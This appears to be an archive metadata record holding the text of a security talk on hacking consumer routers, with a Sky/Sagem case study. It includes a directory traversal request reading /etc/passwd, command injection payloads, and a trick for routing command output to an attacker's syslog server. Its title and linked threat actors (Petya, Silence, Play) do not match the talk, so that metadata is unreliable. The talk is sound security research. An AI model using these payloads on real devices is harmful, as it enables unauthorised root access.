{
    "id": "9226bc79-e192-4afe-8e43-6be249ce8cfb",
    "created_at": "2023-01-12T14:58:54.150589Z",
    "updated_at": "2025-03-27T02:16:25.740235Z",
    "deleted_at": null,
    "sha1_hash": "4c86eeb1feebbc636879c1c39a358ec4bf3f4f5f",
    "title": "2016-07-18 - Third time (un)lucky – improved Petya is out",
    "authors": "",
    "file_creation_date": "2011-11-07T12:46:49Z",
    "file_modification_date": "2011-11-07T12:46:49Z",
    "file_size": 1329274,
    "plain_text": "# HACKING EMBEDDED DEVICES\n\n###### for Fun & Profit\n\n\n-----\n\n# WHAT THIS TALK INTENDS TO COVER!\n\n######  What & Where are Embedded Devices?\n\n  Why history lessons should be learnt!\n\n  Caveats & Defects in Embedded Platforms\n\n  Methodologies for Assessing Embedded Devices\n\n  A Case Study: Looking at a Consumer Device\n\n\n-----\n\n# WHAT & WHERE ARE EMBEDDED DEVICES?\n\n######  Everything & Everywhere!\n\n\n-----\n\n# WHY SHOULD I CARE?\n\n######  Embedded Devices are often “Black Box”\n  Minimal or no documentation & source code\n  Security through obscurity\n  Provided as “Secure” Solutions\n  Vendors have a long history of telling the truth! \n  Provided along with Security Software by ISP’s\n  Anti-Virus\n  Firewall Software\n  History of Security Flaws\n  DD-WRT Remote Root\n  O2 Wireless Box CSRF\n  BeThere BeBox backdoor\n  BTHomeHub CSRF & More \n  Consumer Devices becoming popular targets\n  Psyb0t worm. \n\n\n-----\n\n# HISTORY REPEATS ITSELF…\n\n######  Typically run with no privilege separation\n  Everything runs as highest user privilege\n  SYSTEM / root (uid=0) on all processes  A single defect could potentially compromise the platform \n\n  Embedded Developers are not Security Conscious\n  Commonly write insecure routines  XSRF / XSS \n  Design & Logic bugs (e.g. Directory Traversal)\n  Buffer Overflow Defects\n\n  Small number of commonly re-used Libraries\n  Devices re-use open-source libraries across platforms\n  SNMP  UPnP\n  BusyBox  TinyHttpd, Micro_Httpd … etc\n\n\n-----\n\n# CASE STUDY: SKY BROADBAND\n\n######  Legalities & Assessment\n  Who owns what?  Obtaining Permission\n  Open Source & GPL Code Violations\n\n  Security Assessment\n  Port Scanning & Analysis  Known UPnP flaws.\n\n  Examining an information leak\n  Auditing the Source Code  Building Test Cases\n  Exploiting the bug\n\n  Identifying & Exploiting 0day\n  Finding a potential flaw  Defeating the limitations\n  Creating a reliable remote root exploit\n\n\n-----\n\n# LEGALITIES & ASSESSMENT\n\n######  Consumer broadband devices are typically\n\n## “leased”\n\n######  Your ISP owns the equipment.\n  You should obtain written permission to assess\n  Try Customer Services, Security Contacts &\n\n#### Chocolates.\n\n######  Violation of Terms & Conditions\n  This is often used to “silence” researchers\n\n  Open-Source & GPL\n  Vendors frequently violate the GPL.\n  Vendors release partial GPL source code without\n\n#### modifications. \n\n\n-----\n\n##### Local Area Network Wide Area Network\n\n|Port|Col2|\n|---|---|\n|1863/TCP|Unknown|\n|1864/TCP|Unknown|\n|4443/TCP|Unknown|\n|5190/TCP|SIP? Unknown|\n|5566/TCP|Unknown|\n|30005/TCP|Unknown|\n\n\n###### Firmware Version 1.9 Sky Linux 2.4.x / Linux 2.6.x SAGEM F@ST2504\n\n www default “admin” username password of “sky” provided.\n\n|Port|Col2|\n|---|---|\n|21/TCP|FTP - Disabled.|\n|23/TCP|Telnet - Disabled|\n|53/TCP|dnsmasq-2.23|\n|80/TCP|micro_httpd|\n|1863/TCP|Unknown|\n|1864/TCP|Unknown|\n|4443/TCP|Unknown|\n|5190/TCP|SIP? Unknown|\n|5431/TCP|UPnP|\n|5566/TCP|Unknown|\n|30005/TCP|Unknown|\n\n\n-----\n\n# UPNP – KNOWN VULNERABILITIES\n\n######  Universal Plug and Play \n  Can be used to automatically configure “stuff”\n  Known to allow forwarding internal ports externally.\n  Used for configuring port forwarding “on-the-fly”\n  Miranda is a free UPnP shell tool for auditing.\n  http://code.google.com/p/mirandaupnptool/\n  GNUCitizen Flash UPnP weakness.\n  Demonstrates that we can send UPnP through Flash\n  We can forward internal ports to the Internet\n\n We must know where the port is\n\n We must know the IP address we want to forward\n\n######  myrouter.home and 192.168.0.1 are Sky defaults.\n\n\n-----\n\n# UPNP ATTACKS – MIRANDA EXAMPLE\n\n\n-----\n\n# UPNP ATTACKS – PORT MAPPING\n\n\n-----\n\n# USE THE SOURCE LUKE!\n\n######  Reviewing Directory Traversal Protection in\n\n### micro_httpd.c \n\n\n######  74: if ( sscanf( line, \"%[^ ] %[^ ] %[^ ]\", method, path,\n\n### protocol ) != 3) …\n\n######  83: if ( path[0] != '/’ ) …\n  85: file = &(path[1]); …\n  90: if ( file[0] == '/' || strcmp( file, \"..\" ) == 0 ||\n\n### strncmp( file, \"../\", 3 ) == 0 || strstr( file, \"/../\" ) != (char*) 0 || strcmp( &(file[len-3]), \"/..\" ) == 0 ) …\n\n######  GET /../ HTTP/1.1 \n  Variants are successfully detected. \n  Attempts to request files outside of PATH fail.\n  Seems to protect micro_httpd under normal operation.\n\n\n-----\n\n# TESTING THE PROTECTION! TEST CASES!\n\n######  Copy the routine into a stand-alone C program so\n\n## that potential strings and bypasses can be tested quickly. \n\n\n-----\n\n# BREAKING THE DEVICES ICE WITH STAT()\n\n######  micro_httpd extended by Sky / Sagem for CGI\n  Modified source code breaks the “secure” check.\n  File arguments to CGI scripts could traverse\n\n## ONE directory. \n\n######  Single ../ not matched if a CGI argument\n  One directory is enough to reach root file system /\n\n  Using sky_temp.html is a code path to stat() files\n\n  /sky_temp.html?status=501&title=&text=&this_file=../etc/\n passwd\n\n  If a file or directory exists \"No element returned.” in response.\n\n  We can now enumerate all the files & directories on the device.\n\n\n-----\n\n# A STAT() INFORMATION LEAK IS BORN!\n\n######  Enumerating contents of “/bin” using python and\n\n## shell scripts.\n\n\n-----\n\n# IDENTIFYING A COMMAND EXECUTION BUG\n\n######  Using standard Web Application assessment\n\n## tools I tested each CGI input and FORM request for potential Command Injection bugs.\n\n######  We use common shell escape characters ; ` | &\n  The stat() information leak shows /bin/ping exists.\n  We try |/bin/ping 192.168.0.3 and similar.\n  Non-blind command injection\n  We can see the output of commands on the web page.\n  Blind command injection.\n  We can put a packet sniffer on the network\n  A Vulnerability is found in DynDNS screen!\n  User input passed to shell from CGI arguments.\n\n\n-----\n\n# IDENTIFYING SUCCESSFUL EXPLOITATION\n\n\n-----\n\n# EMBEDDED DEVICE EXPLOIT CAVEATS\n\n######  Command Injection is completely blind.\n  Command Injection has a character limit of 40 chars.\n  Telnet connect back shell?\n  No telnet or netcat command!\n  Tunnel the command output via DNS?\n  Works over UDP\n  Could be used to handle some string data\n  Might be difficult to implement\n  Tunnel the command output via SYSLOG?\n  Works over UDP\n  Can handle string output\n  Probably already implemented for us!\n  Tips & Tricks\n  $IFS can be used as a whitespace\n  2>&1 can be used to redirect stderr to stdout.\n  Try to URL encode problem chars! i.e. 2>%261\n\n\n-----\n\n# BUILDING THE EXPLOIT SHELL\n\n######  Configure the attackers IP as remote syslogd\n  This can be done through the Web interface\n  Listen on UDP port 514 for syslog messages.\n  Using command injection pass output to syslog\n  ddnsHostname=|logger -p 0 ”`ls /bin`”\n  String will send output of ‘ls /bin’ to remote syslog\n  Pseudo-interactive shell allows for better attacks.\n  Once we have a shell we maybe able to view files\n  Upload/Download binaries\n  Explore the device configuration & settings\n\n\n-----\n\n# RUN SCOOBY! A ROOT SHELL IS BORN!\n\n\n-----\n\n# USERS & PASSWORDS\n\n######  Hidden users in passwd file not in manual.\n  Root user has been renamed to “admin”\n  Possible to use “user/user” to authenticate to web\n  Could not change password of user – auth bypass.\n  What are the other users for?\n\n\n-----\n\n# NETWORK SNIFFER COMES BUILT-IN!\n\n\n-----\n\n# FILE TRANSFER? – USE TFTP!\n\n\n-----\n\n# WHAT ABOUT FROM THE INTERNET?\n\n######  Sky user clicks on a link, XSS or IFRAME attack.\n  Flash UPnP exposes the Sky web service to WAN.\n  Could use IFRAME with creds to send? (prompts!!!)\n\n GET request works just as well as a POST request\n\n Possible avenue of attack, couldn’t get working.\n\n######  Default “user/user” authenticates to web device from\n\n#### Internet. No password change? Auth bypass!\n\n######  Attacker sets internet IP as syslog daemon.\n  Attacker starts pseduo interactive shell on device and\n\n#### has “admin” (root) rights thanks to httpd.\n\n######  Attacker can now run a network sniffer, transfer files\n\n#### to and from the network and more. \n\n\n-----\n\n# IMPACT & RISK? CONSUMERS POST-’07.\n\n\n-----\n\n# QUESTIONS?\n\n## Hacker Fantastic\n\n Blog/Twitter/Code & Stuff\n\n http://www.hackerfantastic.com\n\n Thank you!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/ICS Vulnerabilities/Hacking Embedded Devices.pdf"
    ],
    "report_names": [
        "Hacking Embedded Devices.pdf"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535534,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1320670009,
    "ts_modification_date": 1320670009,
    "files": {
        "pdf": "https://archive.orkl.eu/4c86eeb1feebbc636879c1c39a358ec4bf3f4f5f.pdf",
        "text": "https://archive.orkl.eu/4c86eeb1feebbc636879c1c39a358ec4bf3f4f5f.txt",
        "img": "https://archive.orkl.eu/4c86eeb1feebbc636879c1c39a358ec4bf3f4f5f.jpg"
    }
}